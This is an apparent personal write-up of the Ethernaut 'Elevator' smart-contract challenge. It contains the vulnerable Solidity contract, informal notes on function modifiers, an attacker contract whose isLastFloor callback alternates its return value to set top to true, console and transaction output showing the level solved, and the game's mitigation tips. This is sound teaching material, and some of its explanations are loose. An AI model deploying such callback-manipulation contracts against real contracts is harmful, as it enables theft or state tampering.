11. Elevator

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {//interface is object oriented language 
  function isLastFloor(uint) external returns (bool);//eternal is function visibility specifier /public, private, external, internal 
} //who can call specific function 
public -> anybody outside of the contract can call that function 
private -> can only be call from within the current contract its only visible thats denoted as private within the current contract can
external -> anybody outside of a contract can call this function that what we have denoted here this function 
//basically more it utilize resources more effectively when large array or data are passed into or as arguments to these function 
Internal -> that a function only visible private within a given function and within all contracts that inherent

/State modifier //promises how function with interact with "data on the ethereum blockchain" (State)
pure -> no state variable in contract would be read. you wanna be create a function that math operation you wanna put that any state. you would denote that function as pure.
view -> would allow to read state from blockchain but it would not allow you to modify it 



contract Elevator {
  bool public top; //getter //top is set "true" 
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender); //instanse of interface 

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;

    constructor(address _targetAddress) public {
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle; 
        //negate //when isLastFloor is first gonna get called, its gonna be negated to false
        return toggle;
    }//return false that means the negation of false is true, which means we'll pass this if clause right here
     //top variable is true, which means we will beat the level

     function setTop(uint _floor) public {
         target.goTo(_floor);
     }
}


>await contract.top()
false

>await contract.floor()
o {negative: 0, words: Array(2), length: 1, red: null}
length: 1
negative: 0
red: null
words: Array(2)
0: 0 //floor //going to return this promise here //the current floor is no floor 
length: 2
[[Prototype]]: Array(0)
[[Prototype]]: Object

//a visibility modifier or what is sometimes called a visibillity specifier 
//basically denotes who gets to invoke certain function 

>contract.address

'0x8fFa9c56792650D32E2fA82bca71D664AA26Bee0'


//deploy 

[block:10904894 txIndex:3]from: 0xF6e...f30F5to: ElevatorAttack.(constructor)value: 0 weidata: 0x608...57f5blogs: 0hash: 0x6e9...d61dc

//DeployedContract setTopに15階をsetting 

[block:10904912 txIndex:9]from: 0xF6e...f30F5to: ElevatorAttack.setTop(uint256) 0x1F1...5387cvalue: 0 weidata: 0x3f2...0000flogs: 0hash: 0x461...27f04


>await contract.top()
true

>await contract.floor()
o {negative: 0, words: Array(2), length: 1, red: null}
length: 1
negative: 0
red: null
words: Array(2)
0: 15
length: 2
[[Prototype]]: Array(0)
[[Prototype]]: Object


You can use the view function modifier on an interface in order to prevent state modifications.
 The pure modifier also prevents functions from modifying the state. 
 Make sure you read Soliditys documentation and learn its caveats.
 https://docs.soliditylang.org/en/develop/contracts.html#view-functions

An alternative way to solve this level is to build a view function which returns different results depends on input data but dont modify state, e.g. gasleft().












